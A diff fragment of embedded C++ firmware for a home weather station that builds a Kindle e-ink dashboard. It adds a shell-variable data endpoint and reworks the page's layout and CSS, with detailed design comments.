+            else if (t.delta > -1.6f) ai = 3;
+            else ai = 4;
+            kdShellVar(s, "OUT_TEND_ARROW", arrows[ai]);
+            const float dv = kdPressureValue(t.delta, skin.pressureUnit);
+            const int ddec = kdPressureDecimals(skin.pressureUnit) + 1;
+            s->printf("OUT_TEND_DELTA=\"%+.*f\"\n", ddec, (double)dv);
+        } else {
+            s->print("OUT_TEND=\"\"\nOUT_TEND_ARROW=\"\"\nOUT_TEND_DELTA=\"\"\n");
+        }
+    } else {
+        s->print("OUT_TEND=\"\"\nOUT_TEND_ARROW=\"\"\nOUT_TEND_DELTA=\"\"\n");
+    }
+
+    float mn = 1e9f, mx = -1e9f;
+    if (haveOut) {
+        for (int i = 0; i < TrendRing::HOURS; i++) {
+            if (tOut[i].count) {
+                if (tOut[i].min < mn) mn = tOut[i].min;
+                if (tOut[i].max > mx) mx = tOut[i].max;
+            }
+        }
+    }
+    if (mn <= mx) {
+        fmtTemp(buf, sizeof(buf), mn, skin.tempDecimals);
+        kdShellVar(s, "OUT_RANGE_LO", buf);
+        fmtTemp(buf, sizeof(buf), mx, skin.tempDecimals);
+        kdShellVar(s, "OUT_RANGE_HI", buf);
+    } else {
+        s->print("OUT_RANGE_LO=\"\"\nOUT_RANGE_HI=\"\"\n");
+    }
+
+    if (outT.ok && outT.ts && now > outT.ts) {
+        s->printf("OUT_AGE_MIN=%u\n", (unsigned)((now - outT.ts) / 60));
+    } else {
+        s->print("OUT_AGE_MIN=0\n");
+    }
+
+    bool battWarn = false;
+    #ifdef FEATURE_ESPNOW_INGEST
+    battWarn = espnowAnyBatteryWarn();
+    #endif
+    s->printf("OUT_BATT_WARN=%d\n", battWarn ? 1 : 0);
+
+    // ── Indoor ──
+    fmtTemp(buf, sizeof(buf), inT.value, skin.tempDecimals);
+    kdShellVar(s, "IN_TEMP", inT.ok ? buf : "--");
+    s->printf("IN_HUM=%d\n", inH.ok ? (int)roundf(inH.value) : -1);
+    if (inA.ok) s->printf("IN_AQI=%d\n", (int)roundf(inA.value));
+    else s->print("IN_AQI=\n");
+    if (inT.ok && inT.ts && now > inT.ts)
+        s->printf("IN_AGE_MIN=%u\n", (unsigned)((now - inT.ts) / 60));
+    else
+        s->print("IN_AGE_MIN=0\n");
+
+    // ── Clock & Date ──
+    if (now > 1000000000u) {
+        struct tm tm;
+        time_t t = (time_t)now;
+        localtime_r(&t, &tm);
+        s->printf("CLOCK=\"%02d:%02d\"\n", tm.tm_hour, tm.tm_min);
+        {
+            char dbuf[32];
+            snprintf(dbuf, sizeof(dbuf), "%d %s", tm.tm_mday, kdMonth(tm.tm_mon));
+            kdShellVar(s, "DATE", dbuf);
+        }
+        kdShellVar(s, "MONTH_LABEL", kdMonth(tm.tm_mon));
+        s->printf("YEAR=%d\n", tm.tm_year + 1900);
+
+        int wday = (tm.tm_wday + 6) % 7; // 0=Mon..6=Sun
+        time_t monday = t - wday * 86400;
+        for (int i = 0; i < 7; i++) {
+            time_t day = monday + i * 86400;
+            struct tm dtm;
+            localtime_r(&day, &dtm);
+            kdShellVarN(s, "WK%d_NAME", i, kdWeekdayShort(i));
+            s->printf("WK%d_DAY=%d\n", i, dtm.tm_mday);
+        }
+        s->printf("WK_TODAY=%d\n", wday);
+    } else {
+        s->print("CLOCK=\"--:--\"\nDATE=\"\"\nMONTH_LABEL=\"\"\nYEAR=\n");
+        for (int i = 0; i < 7; i++)
+        {
+            kdShellVarN(s, "WK%d_NAME", i, kdWeekdayShort(i));
+            s->printf("WK%d_DAY=\n", i);
+        }
+        s->print("WK_TODAY=-1\n");
+    }
+
+    // ── Forecast ──
+    #ifdef MODULE_FORECAST_ENABLED
+    const auto& fc = forecastModule.snapshot();
+    kdShellVar(s, "FC_SUMMARY", fc.summary);
+    s->printf("FC_CODE=%d\n", fc.code);
+    s->printf("FC_HIGH=%d\n", (int)roundf(fc.highC));
+    s->printf("FC_LOW=%d\n", (int)roundf(fc.lowC));
+    s->printf("FC_WIND=%d\n", (int)roundf(fc.windKph));
+    for (int i = 0; i < 3; i++) {
+        kdShellVarN(s, "FC%d_LABEL", i, fc.outlook[i].label);
+        s->printf("FC%d_CODE=%d\n", i, fc.outlook[i].code);
+        s->printf("FC%d_TEMP=%d\n", i, (int)roundf(fc.outlook[i].tempC));
+        if (!isnan(fc.outlook[i].lowC))
+            s->printf("FC%d_LOW=%d\n", i, (int)roundf(fc.outlook[i].lowC));
+        else
+            s->printf("FC%d_LOW=\n", i);
+    }
+    #else
+    s->print("FC_SUMMARY=\"\"\nFC_CODE=-1\nFC_HIGH=\nFC_LOW=\nFC_WIND=\n");
+    for (int i = 0; i < 3; i++)
+        s->printf("FC%d_LABEL=\"\"\nFC%d_CODE=-1\nFC%d_TEMP=\nFC%d_LOW=\n", i, i, i, i);
+    #endif
+
+    // ── UI labels ──
+    kdShellVar(s, "LBL_OUTSIDE", KD_T("OUTSIDE", "НАВЪН"));
+    kdShellVar(s, "LBL_INSIDE", KD_T("INSIDE", "ВЪТРЕ"));
+    kdShellVar(s, "LBL_LAST24", KD_T("LAST 24 HOURS", "ПОСЛЕДНИТЕ 24 ЧАСА"));
+    kdShellVar(s, "LBL_FORECAST", KD_T("FORECAST", "ПРОГНОЗА"));
+    kdShellVar(s, "LBL_MEASURED", KD_T("Measured on site", "Измерено на място"));
+    kdShellVar(s, "LBL_NO_READING", KD_T("no reading", "няма данни"));
+    kdShellVar(s, "LBL_WIND", KD_T("wind", "вятър"));
+    kdShellVar(s, "LBL_TO", KD_T("to", "до"));
+
+    // ── The eleven places ──
+    //
+    // The configurable layout, emitted alongside the fixed OUT_*/IN_* keys
+    // rather than instead of them. A Kindle running an older copy of
+    // update_dash.sh keeps working from the keys it knows; a current one draws
+    // the places and ignores them. Nobody has to update the reader and the
+    // collector in the same minute.
+    emitZones(s, skin, now);
+
+    // ── Metadata ──
+    const uint16_t resW = skin.fbinkResW ? skin.fbinkResW : (uint16_t)KINDLE_PAGE_W;
+    const uint16_t resH = (resW > 600) ? 1448 : 800;
+    s->printf("RES_W=%u\n", resW);
+    s->printf("RES_H=%u\n", resH);
+    kdShellVar(s, "LANG", KD_T("en", "bg"));
+    s->printf("DECIMALS=%d\n", skin.tempDecimals);
+    s->printf("CLOCK_STYLE=%d\n", skin.clockStyle);
+    s->printf("SHOW_FLAGS=%u\n", skin.showFlags);
+
+    req->send(s);
+}
+
+static void handleKindle(AsyncWebServerRequest* req) {
+    // ONLY WHAT THIS PAGE STILL READS. The outdoor humidity and pressure and
+    // the indoor humidity were fetched here when the layout hardwired them;
+    // the places resolve their own readings now, and these were left behind
+    // costing two ring-buffer lookups under the data mutex on every render.
+    // The pressure series cost more: a full twenty-four-hour walk of the trend
+    // ring, computed and then dropped.
+    //
+    // The two temperatures stay because the refresh cadence below is derived
+    // from whichever of them is newer, and the two temperature series stay
+    // because the chart draws them.
+    const Latest outT = latestOf(outdoorSensorId(), "temperature");
+    const Latest inT  = latestOf(indoorSensorId(),  "temperature");
+
+    const uint32_t now = (uint32_t)time(nullptr);
+
+    TrendRing::Hour tOut[TrendRing::HOURS];
+    TrendRing::Hour tIn [TrendRing::HOURS];
+    const bool haveOut = trendRing.series(outdoorSensorId(), "temperature", now, tOut);
+    const bool haveIn  = trendRing.series(indoorSensorId(),  "temperature", now, tIn);
 
     // A clamped COPY, not a reference into the live config. The page reads
     // this a dozen times while it builds; taking the values once means a save
@@ -508,8 +1339,18 @@ static void handleKindle(AsyncWebServerRequest* req) {
     // The clock only makes its once-a-minute demand when it is actually drawn
     // — an unsynced device prints "clock not set" and has nothing to keep
     // fresh, so it must be allowed to back off like any other stale source.
+    // The stored cadence, with the compile-time knobs as the defaults. 0 and
+    // 0xFF are the "not configured" sentinels — see KindleConfig — so a device
+    // that has never opened the settings form behaves exactly as it did before
+    // the fields existed.
+    KdCadence cad;
+    if (skin.refreshSec)             cad.refreshSec      = skin.refreshSec;
+    if (skin.followData != 0xFF)     cad.followData      = (skin.followData != 0);
+    if (skin.clockPinRefresh != 0xFF) cad.clockPinRefresh = (skin.clockPinRefresh != 0);
+    cad.clamp();
+
     p += kdRefreshDelaySec(outT.ts > inT.ts ? outT.ts : inT.ts, now,
-                           now > KINDLE_MIN_REAL_TS);
+                           now > KINDLE_MIN_REAL_TS, cad);
     p += F("\"><title>" KD_T("Weather", "Времето") "</title><style>");
 
     // The stylesheet, emitted rather than stored as one literal: every number
@@ -531,123 +1372,154 @@ static void handleKindle(AsyncWebServerRequest* req) {
     // levels — the dithering that argued against greys here comes from
     // gradients and from tones too close together, not from flat
     // well-separated fills. Spaced this far apart each renders solid.
-    KD_S(".hero td{padding:");                 KD_N(2);
+    // ── The top block: two columns ──────────────────────────────────────────
+    // Palette: #000 #444 #777 #aaa #d8d8d8 #fff. The panel has 16 real grey
+    // levels — the dithering that argued against greys here comes from
+    // gradients and from tones too close together, not from flat
+    // well-separated fills. Spaced this far apart each renders solid.
+    KD_S(".top td{padding:");                  KD_N(2);
     KD_S("px 0 ");                             KD_N(6);
     KD_S("px}");
 
-    // Two classes, not one: .hero td above is (0,1,1) and would otherwise
+    // Two classes, not one: .top td above is (0,1,1) and would otherwise
     // outrank a bare .sep (0,1,0), zeroing this padding and letting the rule
-    // sit against the first glyph of the inside reading.
-    KD_S(".hero .sep{border-left:");           KD_N(1);
-    KD_S("px solid #aaa;padding-left:");       KD_N(30);
+    // sit against the first glyph of the indoor block.
+    KD_S(".top .sep{border-left:");             KD_N(1);
+    KD_S("px solid #aaa;padding-left:");        KD_N(30);
     KD_S("px}");
 
-    // The badge sits on the label's own line, pushed right. float and not
+    // The badge sits on the heading's own line, pushed right. float and not
     // flex: this page is built for a browser that may be WebKit 531, where
     // flexbox does not exist. A float has worked since 1996.
     KD_S(".bw{float:right;margin-top:"); KD_N(-2);
     KD_S("px}");
 
-    KD_S(".lab{font-size:");                   KD_N(12);
-    KD_S("px;letter-spacing:");                KD_N(4);
+    // ONE CAPTION STYLE FOR THE WHOLE PAGE. The group headings, the cell
+    // captions and the section rules below all use it, so a reader who has
+    // learnt what small tracked grey means on this page has learnt it once.
+    KD_S(".lab{font-size:");                   KD_N(10);
+    KD_S("px;letter-spacing:");                KD_N(3);
     KD_S("px;text-transform:uppercase;margin-bottom:"); KD_N(2);
-    KD_S("px;color:#777}");
+    KD_S("px;color:#777;white-space:nowrap;overflow:hidden}");
 
-    // Fixed height, not line-height alone: the two columns use different
-    // sizes, and without it the text under the smaller numeral starts higher
-    // and the column rule looks ragged.
-    KD_S(".big{font-size:");                   KD_N(92);
-    KD_S("px;line-height:");                   KD_N(88);
-    KD_S("px;height:");                        KD_N(88);
-    KD_S("px;letter-spacing:");                KD_N(-3);
+    // ── The headline ────────────────────────────────────────────────────────
+    // HERO and BIG on one baseline with a slash between them. They are usually
+    // one measurement of one parcel of air — 8.4° / 71% — and a line break
+    // between those two puts a paragraph boundary through a single reading.
+    //
+    // nowrap and hidden rather than a smaller face at some width: the pair is
+    // the one thing on the page that must not reflow, and the sizes below were
+    // measured against the widest it gets, -12.4° / 100%.
+    KD_S(".head{line-height:1.02;white-space:nowrap;overflow:hidden;letter-spacing:-");
+    KD_N(1);
     KD_S("px}");
-
-    // Four glyphs ("21.0", "-8.4") overrun the column at the larger size.
-    KD_S(".big4{font-size:");                  KD_N(74);
-    KD_S("px;letter-spacing:");                KD_N(-2);
+    KD_S(".v1{font-size:");                    KD_N(88);
     KD_S("px}");
-
-    KD_S(".deg{font-size:");                   KD_N(30);
-    KD_S("px;letter-spacing:0;vertical-align:top;line-height:1;"
-         "position:relative;top:");            KD_N(12);
+    KD_S(".v2{font-size:");                    KD_N(44);
+    KD_S("px;color:#444;letter-spacing:");     KD_N(-1);
     KD_S("px}");
-
-    KD_S(".sub{font-size:");                   KD_N(15);
-    KD_S("px;margin-top:");                    KD_N(6);
-    KD_S("px;line-height:1.45;color:#444}");
-    KD_S(".sub-t{margin-top:");                KD_N(1);
-    KD_S("px}");
-    KD_S(".dim{color:#777}");
-
-    // Temperature and humidity are one reading of one parcel of air, so they
-    // share a baseline and a slash rather than a line break.
     KD_S(".slash{font-size:");                 KD_N(44);
     KD_S("px;color:#aaa;letter-spacing:0;padding:0 "); KD_N(7);
     KD_S("px;position:relative;top:");         KD_N(-5);
     KD_S("px}");
-    KD_S(".hum-o{font-size:");                 KD_N(44);
-    KD_S("px;color:#444;letter-spacing:");     KD_N(-1);
-    KD_S("px}");
 
-    // A six-glyph reading ("-12.4") already drops to .big4; the pair beside it
-    // has to come down too or "100%" runs off the column.
-    KD_S(".big4 .slash{font-size:");           KD_N(34);
-    KD_S("px;padding:0 ");                     KD_N(5);
-    KD_S("px;top:");                           KD_N(-4);
-    KD_S("px}");
-    KD_S(".big4 .hum-o{font-size:");           KD_N(34);
-    KD_S("px}");
+    // The 24 h low-to-high and the age, on one line under the headline.
+    // The 24 h low-to-high and the age, on one line under the headline. Set in
+    // the page's mid grey rather than its dark one: it is context for the big
+    // number above it, not a reading in its own right, and at #444 it competed
+    // with the grid underneath. Switchable off entirely — see KSHOW_RANGE.
+    KD_S(".sub{font-size:");                   KD_N(14);
+    KD_S("px;margin-top:");                    KD_N(4);
+    KD_S("px;line-height:1.45;color:#777;white-space:nowrap;overflow:hidden}");
+    KD_S(".dim{color:#777}");
 
-    // The absolute pressure is the one figure here compared against memory
-    // rather than against the page; at 15px it was set as a footnote to the
-    // humidity.
-    KD_S(".pres{font-size:");                  KD_N(34);
-    KD_S("px;line-height:1.15;margin-top:");   KD_N(5);
-    KD_S("px;letter-spacing:");                KD_N(-1);
+    // ── The two-by-two grid, and the indoor row ─────────────────────────────
+    // The same shape at two sizes: caption above, value under it. A caption on
+    // the value's own line would be denser, and it also makes every cell a
+    // different width — six captions of different lengths put six numbers at
+    // six different x. Above the value they all start at the cell's left edge.
+    //
+    // table-layout:fixed so the width attribute is obeyed. Without it the
+    // browser sizes columns by content and a four-digit pressure beside a
+    // two-digit humidity takes space the layout had allocated.
+    KD_S(".grid,.inrow{table-layout:fixed;margin-top:"); KD_N(10);
     KD_S("px}");
-    KD_S(".pres-u{font-size:");                KD_N(17);
-    KD_S("px;color:#777;letter-spacing:0}");
+    KD_S(".grid td,.inrow td{padding:0 ");     KD_N(10);
+    KD_S("px 0 0;vertical-align:top}");
+    KD_S(".cv{line-height:1.0;white-space:nowrap;overflow:hidden;letter-spacing:-");
+    KD_N(1);
+    KD_S("px}");
+    // THE INDOOR ROW ALIGNS ALONG ITS BOTTOM, not its top. The first field has
+    // no caption and is half again as tall as the other two, so aligning tops
+    // would leave those two floating above a much larger number. The value is
+    // the last thing in every cell, so bottom alignment puts all three on one
+    // edge and pushes the two captions up into the space the big one does not
+    // use — which is the space its missing caption gave back.
+    KD_S(".inrow td{vertical-align:bottom}");
+    KD_S(".gv{font-size:");                    KD_N(31);
+    KD_S("px}");
+    // Three across is a third of half a page, which "1008 hPa" with a tendency
+    // arrow after it does not fit at the two-across size. The row carries the
+    // class, so a page with three in one row and two in the next sets each row
+    // at the size its own width can hold.
+    KD_S(".grid-3 .gv{font-size:");            KD_N(26);
+    KD_S("px}");
+    KD_S(".iv{font-size:");                    KD_N(28);
+    KD_S("px}");
+    // The first indoor field is the one the reader looks at, so it is larger by
+    // TYPE and not by width — the columns stay equal, which is what keeps the
+    // row aligned whether it holds three fields or two.
+    // The first indoor field spends its caption's line on type instead: the
+    // heading above already says which room this is, so a "TEMP" under it says
+    // nothing the degree sign has not.
+    KD_S(".iv-1{font-size:");                  KD_N(52);
+    KD_S("px}");
+    KD_S(".val-b{font-weight:700}");
 
-    // Right column, upper two thirds. Fixed height rather than line-height
-    // alone, for the same reason .big has one: it is what keeps the divider
-    // below it level with the left column's text. The height is set so the
-    // divider lands two thirds of the way down the cell the left column sizes
-    // — at 116 the inside block finished short and left a hole under it.
+    // How dark a value is drawn, per place. Black is the default and carries no
+    // class at all, so a page nobody has touched emits none of these.
+    KD_S(".ink-d{color:#444}");
+    KD_S(".ink-m{color:#777}");
+    KD_S(".ink-l{color:#aaa}");
+
+    // A unit is a footnote to its number, not a second number.
+    KD_S(".unit{font-size:0.42em;font-weight:400;color:#444;letter-spacing:0}");
+    // The degree, set as the design has always set it: small, at the cap line
+    // rather than on the baseline. In em so that one rule serves every size on
+    // the page — a pixel offset tuned on the headline is wrong on a grid cell.
+    // top is relative to the DEGREE's own size, which is why 0.38 here is the
+    // same proportion the fixed 12 px on a 30 px glyph was.
+    KD_S(".unit-d{font-size:0.34em;vertical-align:top;line-height:1;"
+         "position:relative;top:0.38em}");
+    // The three-hour tendency arrow, for the place that asked for one.
+    KD_S(".tend{font-size:0.5em;color:#444;letter-spacing:0;padding-left:0.15em}");
+
+    // ── The clock ───────────────────────────────────────────────────────────
+    // THE FIXED HEIGHT IS GONE, and the comment that used to justify it with
+    // it: it existed to keep a divider level with the indoor block, and that
+    // block now sits under the clock in the same column rather than beside it.
+    // What was alignment had become 35 px of empty cell, on a page whose whole
+    // budget is one 800 px screen with no scrollbar to reveal what falls off.
     KD_S(".clock{font-size:");                 KD_N(96);
-    KD_S("px;line-height:");                   KD_N(104);
-    KD_S("px;height:");                        KD_N(139);
-    KD_S("px;padding-top:");                   KD_N(12);
+    KD_S("px;line-height:");                   KD_N(100);
     KD_S("px;letter-spacing:");                KD_N(-4);
     KD_S("px}");
     KD_S(".clock-x{font-size:");               KD_N(44);
-    KD_S("px;line-height:");                   KD_N(104);
-    KD_S("px;height:");                        KD_N(116);
+    KD_S("px;line-height:");                   KD_N(100);
     KD_S("px;color:#777;letter-spacing:0}");
-
+    // The hairline between the clock and the indoor block. Lighter than the
+    // page's section rules: it separates two things inside one column, where
+    // .rule separates the columns from what is under them.
     KD_S(".inrule{border-top:");               KD_N(1);
-    KD_S("px solid #aaa;margin-bottom:");      KD_N(7);
-    KD_S("px}");
-    KD_S(".in-t{font-size:");                  KD_N(40);
-    KD_S("px;line-height:1.05;letter-spacing:"); KD_N(-1);
-    KD_S("px}");
-    KD_S(".in-d{font-size:");                  KD_N(19);
-    KD_S("px;vertical-align:top;letter-spacing:0;position:relative;top:"); KD_N(5);
-    KD_S("px}");
-    KD_S(".slash-i{font-size:");               KD_N(26);
-    KD_S("px;padding:0 ");                     KD_N(5);
-    KD_S("px;top:");                           KD_N(-2);
-    KD_S("px}");
-    KD_S(".hum-i{font-size:");                 KD_N(30);
-    KD_S("px;color:#444}");
-    KD_S(".in-age{font-size:");                KD_N(13);
-    KD_S("px;letter-spacing:0;margin-left:");  KD_N(10);
+    KD_S("px solid #d8d8d8;margin:");          KD_N(10);
+    KD_S("px 0 ");                             KD_N(8);
     KD_S("px}");
 
     // Three rules on the page, so a few px each is what keeps the footer above
     // the fold. Measured, not guessed.
     KD_S(".rule{border-top:");                 KD_N(1);
-    KD_S("px solid #aaa;margin:");             KD_N(14);
-    KD_S("px 0 ");                             KD_N(9);
+    KD_S("px solid #aaa;margin:");             KD_N(10);
+    KD_S("px 0 ");                             KD_N(7);
     KD_S("px}");
     KD_S(".sec{font-size:");                   KD_N(12);
     KD_S("px;letter-spacing:");                KD_N(4);
@@ -765,128 +1637,12 @@ static void handleKindle(AsyncWebServerRequest* req) {
 
     // No masthead. The place name never changed and the date is carried by the
     // week strip at the foot, so the row was two lines of furniture above the
-    // only two numbers the page exists to show. The hero row is the masthead.
-
-    // Outside on the left, clock over inside on the right
-    p += F("<table class=\"hero\"><tr><td width=\"50%\">"
-           "<div class=\"lab\">" KD_T("Outside", "Навън"));
-    if ((skin.showFlags & KSHOW_BATTERY) && batteryWarningActive()) appendBatteryBadge(p);
-    p += F("</div><div class=\"");
-    fmtTemp(buf, sizeof(buf), outT.value, skin.tempDecimals);
-    p += bigClass(buf); p += F("\">"); p += buf;
-    p += F("<span class=\"deg\">&deg;</span>");
-    // Humidity rides on the temperature's baseline, a slash between them. It
-    // is the same measurement of the same air at the same instant, so a line
-    // break was putting a paragraph boundary through one reading.
-    if (outH.ok && (skin.showFlags & KSHOW_OUT_HUM)) {
-        p += F("<span class=\"slash\">/</span><span class=\"hum-o\">");
-        fmtInt(buf, sizeof(buf), outH.value); p += buf; p += F("%</span>");
-    }
-    p += F("</div><div class=\"sub\">");
-    if (outT.ok) {
-        float mn, mx;
-        if (haveOut && (skin.showFlags & KSHOW_RANGE) && windowExtremes(tOut, mn, mx)) {
-            // The 24 h span in figures, so the night's low is not only
-            // readable off the chart.
-            fmtTemp(buf, sizeof(buf), mn, skin.tempDecimals); p += buf;
-            p += F(KD_T(" to ", " до "));
-            fmtTemp(buf, sizeof(buf), mx, skin.tempDecimals); p += buf;
-            p += F("&deg;");
-        }
-        p += F("<span class=\"dim\">");
-        appendAge(p, outT.ts, now);
-        p += F("</span>");
-    } else {
-        p += F(KD_T("<span class=\"dim\">no reading &mdash; check the node</span>",
-                    "<span class=\"dim\">няма данни &mdash; провери възела</span>"));
-    }
-    p += F("</div>");
-
-    // Pressure gets its own size. The absolute figure is the one number here
-    // that a reader compares against memory rather than against the page, and
-    // at 15px it was set as a footnote to the humidity.
-    if (outP.ok && (skin.showFlags & KSHOW_PRESSURE)) {
-        p += F("<div class=\"pres\">");
-        // The sensor reports hPa; the reader may think in mmHg or inHg. A
-        // barometric figure is compared against memory rather than against the
-        // page, so it has to be in the units that memory is in.
-        const float pv = kdPressureValue(outP.value, skin.pressureUnit);
-        const int   pd = kdPressureDecimals(skin.pressureUnit);
-        if (pd) { p += String(pv, pd); }
-        else    { fmtInt(buf, sizeof(buf), pv); p += buf; }
-        p += F("<span class=\"pres-u\"> ");
-        p += kdPressureUnitLabel(skin.pressureUnit);
-        p += F("</span></div>");
-    }
-    if (haveP && (skin.showFlags & KSHOW_TENDENCY)) {
-        const Tendency t = pressureTendency(tPress);
-        if (t.have) {
-            p += F("<div class=\"sub sub-t\">"); p += t.arrow; p += F(" "); p += t.word;
-            // The change follows the same unit as the figure above it. A
-            // "-1.2 hPa/3h" under a reading in mmHg is two scales on one
-            // block, which is exactly the confusion the setting exists to end.
-            const float dv = kdPressureValue(t.delta, skin.pressureUnit);
-            p += F(" <span class=\"dim\">(");
-            if (dv >= 0) p += F("+");
-            // One more place than the absolute figure: the three-hour change
-            // is small in every unit, and rounded to the same precision as the
-            // reading it would read as zero all winter.
-            p += String(dv, kdPressureDecimals(skin.pressureUnit) + 1);
-            p += F(" "); p += kdPressureUnitLabel(skin.pressureUnit);
-            p += F("/3h)</span></div>");
-        }
-    }
-    p += F("</td><td width=\"50%\" class=\"sep\">");
-
-    // Upper two thirds: the time. An e-ink panel on a shelf is read across a
-    // room, and until now the only clock was 14px of grey at the top corner.
-    if (now > 1000000000u) {
-        const time_t when_t = (time_t)now;
-        struct tm tmv;
-        if (localtime_r(&when_t, &tmv) != nullptr) {
-            char hm[12];
-            kdFmtTime(hm, sizeof(hm), tmv, skin.timeFormat);
-            p += F("<div class=\"clock\">"); p += hm; p += F("</div>");
-            // The one clock style that needs markup as well as a rule. Its
-            // height was taken out of the clock's own (see KindleSkin.h), so
-            // the hairline below stays level with the outdoor column.
-            if (skin.clockStyle == KCLOCK_DATED) {
-                char dt[32];
-                kdFmtDate(dt, sizeof(dt), tmv, skin.dateFormat);
-                p += F("<div class=\"clock-d\">"); p += dt; p += F("</div>");
-            }
-        } else {
-            p += F("<div class=\"clock-x\">" KD_T("no time", "няма час") "</div>");
-        }
-    } else {
-        // Not "--:--": a plausible-looking blank clock invites the reader to
-        // wonder what time it is, where "clock not set" names the fault.
-        p += F("<div class=\"clock-x\">" KD_T("clock not set", "часът не е сверен") "</div>");
-    }
-
-    // Lower third: inside temperature and humidity. The 24 h inside range went
-    // with the clock — the dashed line on the chart already carries it, and it
-    // was the least-read figure on the page.
-    if (skin.showFlags & KSHOW_INSIDE) {
-        p += F("<div class=\"inrule\"></div>"
-               "<div class=\"lab\">" KD_T("Inside", "Вътре") "</div><div class=\"in-t\">");
-        if (inT.ok) {
-            fmtTemp(buf, sizeof(buf), inT.value, skin.tempDecimals); p += buf;
-            p += F("<span class=\"in-d\">&deg;</span>");
-            if (inH.ok) {
-                p += F("<span class=\"slash slash-i\">/</span><span class=\"hum-i\">");
-                fmtInt(buf, sizeof(buf), inH.value); p += buf; p += F("%</span>");
-            }
-            p += F("<span class=\"in-age dim\">");
-            appendAge(p, inT.ts, now);
-            p += F("</span>");
-        } else {
-            p += F("<span class=\"in-age dim\">"
-                   KD_T("no reading", "няма данни") "</span>");
-        }
-        p += F("</div>");
-    }
-    p += F("</td></tr></table>");
+    // only two numbers the page exists to show. The top block is the masthead.
+    //
+    // THE SAME ELEVEN PLACES THE FBINK RENDERER DRAWS, resolved by the same call,
+    // so "what is in this place" has one answer on this device rather than one
+    // per screen.
+    appendTopBlock(p, skin, now);
 
     if (skin.showFlags & KSHOW_CHART) {
         p += F("<div class=\"rule\"></div><div class=\"sec\">"
@@ -938,10 +1694,10 @@ static void handleKindle(AsyncWebServerRequest* req) {
 }
 
 void kindleTrackTrends() {
-    trendRing.track(KINDLE_OUTDOOR_SENSOR, "temperature");
-    trendRing.track(KINDLE_INDOOR_SENSOR,  "temperature");
-    trendRing.track(KINDLE_OUTDOOR_SENSOR, "pressure");
-    trendRing.track(KINDLE_OUTDOOR_SENSOR, "humidity");
+    trendRing.track(outdoorSensorId(), "temperature");
+    trendRing.track(indoorSensorId(),  "temperature");
+    trendRing.track(outdoorSensorId(), "pressure");
+    trendRing.track(outdoorSensorId(), "humidity");
 }
 
 // ---------------------------------------------------------------------------
@@ -1070,8 +1826,19 @@ static void handleKindleClear(AsyncWebServerRequest* req) {
 // silently unreachable, and the pages simply rendered the dashboard instead.
 // The children go first.
 void registerKindleDashboard(AsyncWebServer& server) {
+    // Loaded here rather than in setup(): registration is the first moment the
+    // dashboard exists as a thing, the filesystem is up by now, and it keeps
+    // the sketch from needing to know that slots are a file at all.
+    //
+    // The two sensor ids seed the defaults, so a device that has never
+    // configured a slot gets the page it had before slots existed — built from
+    // whichever sensors it was already pointing at.
+    if (activeFS) kdSlotsBegin(*activeFS, outdoorSensorId(), indoorSensorId());
+
     server.on("/kindle/probe", HTTP_GET, handleKindleProbe);
     server.on("/kindle/clear", HTTP_GET, handleKindleClear);
+    server.on("/kindle/data",  HTTP_GET, handleKindleData);
+    server.on("/kindle/graph.bmp", HTTP_GET, handleKindleGraph);
     server.on("/kindle",       HTTP_GET, handleKindle);
 }
 
